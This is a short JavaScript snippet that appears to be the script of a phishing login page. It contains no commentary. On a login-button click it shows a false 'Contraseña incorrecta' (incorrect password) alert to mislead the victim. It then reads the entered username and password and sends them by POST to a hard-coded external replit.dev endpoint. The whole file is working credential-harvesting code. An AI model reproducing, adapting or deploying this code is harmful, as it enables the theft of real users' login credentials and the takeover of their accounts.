endpoint = "https://02e97e99-8d29-4c65-acf6-35a4088bc375-00-ra3qlgbbio0m.picard.replit.dev:3000/"

function SendToEndpoint(username, pass) {
    data = JSON.stringify({
        "username": username,
        "password": pass
    })
    fetch(endpoint, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: data
    }).catch(function(rejectedReason) {
        console.log("Error while sending data: " + rejectedReason)
    })
}

document.getElementById('loginButton').addEventListener('click', function() {
    try {
        alert("Contraseña incorrecta")
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        SendToEndpoint(username, password)
    } catch (err) {
        console.log("Error while fetching data: " + err)
    }
});
